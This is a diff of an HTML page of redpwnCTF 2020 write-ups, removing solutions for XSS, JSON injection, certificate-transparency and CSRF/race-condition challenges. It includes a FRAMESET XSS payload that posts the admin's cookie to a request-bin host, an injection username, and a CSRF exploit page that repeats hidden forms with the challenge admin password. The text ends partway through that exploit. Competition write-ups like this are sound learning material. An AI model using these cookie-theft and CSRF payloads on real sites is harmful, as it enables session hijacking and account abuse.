+<img alt="a" src="/writeups-pic/20.jpg"/>
+<img alt="b" src="/writeups-pic/21.jpg"/></p>
 <p>And the hint says :</p>
 <pre><code>Everyone's favorite guess god Tux just sent me a flag that he somehow encrypted with a color wheel!
 
@@ -522,404 +920,6 @@ I don't even know where to start, the wheel looks more like a clock than a ciphe
 <p>And we just have to convert the color in first image with the number based on the  color-wheel, convert it using base-12</p>
 <p>And we got the flag</p>
 <p>flag = <code>flag{9u3ss1n9_1s_4n_4rt}</code></p>
-<h1>pastebin</h1>
-<blockquote>
-<p>I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it <a href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin" target="_blank">here</a> <br/>
-  Site: https://static-pastebin.2020.redpwnc.tf <br/>
-  For this challenge I use a very nice <a href="https://xsshunter.com/" target="_blank">tool</a> to solve it, the flag is the admin's cookie <br/>
-  flag : <code>flag{54n1t1z4t10n_k1nd4_h4rd}</code> </p>
-</blockquote>
-<h1>panda-facts</h1>
-<blockquote>
-<p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down! <br/>
-  Site: panda-facts.2020.redpwnc.tf <br/>
-  The concept is pretty much the same with any injection vulnerabilities, we can insert <code>name", "member" : 1, "x" : "somethingtomatchthequotationmarks</code> as our username, and it will inject a value of member and set it to 1, then x just to match the quotation marks.</p>
-</blockquote>
-<p>flag : <code>flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}</code></p>
-<h1>static-static-hosting</h1>
-<blockquote>
-<p>This is another xss challenge with a better filter so we have to craft a better payload basically</p>
-</blockquote>
-<p>I struggle really hard on this one because the filter are just really strong, and i come up with a working <code>iframe</code> payload</p>
-<p>But it didn't work, and when i asked the organizer it turns out that the admin site are using chrome to run the payload </p>
-<p>And with the fact that using <code>iframe</code> will create another child element thus creating a situation where we can't take the admin's cookie because of <strong>chrome</strong> (insert chrome jokes here)</p>
-<p>so I came up with another solution</p>
-<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"javascript:javascript:alert(document.cookie);"</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>It turns out that we can use frame and run js inside of the <code>src</code></p>
-<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">FRAME</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"javascript:javascript:(function() {</span>
-<span class="s">        var xmlHttp = new XMLHttpRequest();</span>
-<span class="s">        xmlHttp.open('POST', 'https://en8nxg3ahdy8p.x.pipedream.net', false );</span>
-<span class="s">        xmlHttp.send(btoa(document.cookie));</span>
-<span class="s">        return xmlHttp.responseText;   </span>
-<span class="s">    })();"</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">FRAMESET</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>So by creating payload like that, it will grab admin's cookie when the admin visit the site and send the cookie to our site in request bin and in this case the flag</p>
-<p>flag = <code>flag{wh0_n33d5_d0mpur1fy}</code></p>
-<h1>anti-textbook</h1>
-<blockquote>
-<p>This is the most interesting challenge from all web challenge i've come up so far in so many ctf's</p>
-</blockquote>
-<p>We are only given this <code>n</code> and <code>e</code></p>
-<pre><code>e: 65537
-n: 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561
-</code></pre>
-<p>And i that it must be something related to an RSA crypto, <br/>
-looking at the hint : </p>
-<pre><code>It's important for public keys to be transparent.
-
-Hint: certificate-transparency.org
-</code></pre>
-<p>So thanks to @Wrth guess, we might be able to create a certificate from those 2 numbers</p>
-<p>And i come up with this script to convert <code>e</code> and <code>n</code> to a <code>.pem</code> certificate</p>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.asymmetric.rsa</span> <span class="kn">import</span> <span class="n">RSAPublicNumbers</span>
-<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
-<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>
-
-<span class="n">exponent</span> <span class="o">=</span> <span class="mi">65537</span>
-<span class="n">modulus</span> <span class="o">=</span> <span class="mi">23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561</span>
-<span class="n">numbers</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">exponent</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span>
-<span class="n">public_key</span> <span class="o">=</span> <span class="n">numbers</span><span class="o">.</span><span class="n">public_key</span><span class="p">(</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
-<span class="n">pem</span> <span class="o">=</span> <span class="n">public_key</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
-    <span class="n">encoding</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span>
-    <span class="nb">format</span><span class="o">=</span><span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span>
-<span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
-</code></pre></div>
-<p>And we got a <code>.pem</code> certificate :</p>
-<pre><code>-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUwe
-T8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/
-C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9
-FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuT
-VXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9
-ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZ
-oQIDAQAB
------END PUBLIC KEY-----
-</code></pre>
-<p>We can convert this certificate to sha256 hash and then search for related sha256 certificate in <a href="https://censys.io/" target="_blank">https://censys.io/</a></p>
-<p>I use this openssl script to convert <code>.pem</code> to sha256 hash</p>
-<div class="codehilite"><pre><span></span><code>openssl rsa -in pubkey.pem -pubin -outform der <span class="p">|</span> openssl dgst -sha256
-</code></pre></div>
-<p>find the related site with that sha256 certificate this way <br/>
-https://censys.io/certificates?q=9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f</p>
-<p>And we got a website that has the flag inside</p>
-<p>flag = <code>flag{c3rTific4t3_7r4n5pArAncY_fTw}</code></p>
-<h1>cookie-recipes-v2</h1>
-<blockquote>
-<p>I'm really proud that i can complete this challenge because its 'kinda' something new to me</p>
-</blockquote>
-<p>So we are given a site with a persistent cookie (that also works as csrf) and the important thing is that every process will just rely on that static csrf cookie so it must be a csrf attack, but by reviewing the code</p>
-<p>I see some interesting things happens when we want the admin to give a <code>gift</code> to our account, there is this TOC-TOU vulnerability leading us to racing condition attack</p>
-<p>So in summary its a combination between csrf and race condition attack</p>
-<p>The plan here are</p>
-<pre><code>1. Create a malicious site with very-finely(i tried hard so much on this) crafted exploit inside
-2. Create a link to the site using awesome php+ngrok combo
-3. Let the admin visit the site and do that csrf+race_condition attack for us
-</code></pre>
-<p>Here's my exploit code</p>
-<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="c">&lt;!-- admin pass = n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn --&gt;</span>
-    <span class="c">&lt;!-- remote url = https://cookie-recipes-v2.2020.redpwnc.tf --&gt;</span>
-
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"text/plain"</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=152722133074553091"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">id</span><span class="o">=</span><span class="s">"json"</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">'{"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn","x":"'</span> <span class="na">value</span><span class="o">=</span><span class="s">'x"}'</span> <span class="p">/&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-
-    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
